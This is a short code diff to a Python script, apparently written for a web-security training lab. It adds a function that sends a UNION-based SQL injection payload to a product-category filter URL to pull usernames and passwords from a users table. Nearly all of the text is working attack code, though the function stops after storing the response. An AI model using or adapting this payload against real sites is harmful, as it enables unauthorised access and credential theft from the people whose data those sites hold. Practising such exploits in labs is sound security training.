@@ -1,9 +1,17 @@
 import requests
 import sys
 import urllib3
+from bs4 import BeautifulSoup
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {'https': 'http://127.0.0.1', 'http': 'http://127.0.0.1'}
+
+def exploit_sqli_users_table(url):
+    username = 'adminstrator'
+    path = '/filter?category=Gifts'
+    sql_payload =  "' UNION select username, password from users--"
+    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
+    res = r.text
 
 if __name__ == "__main__":
     try:
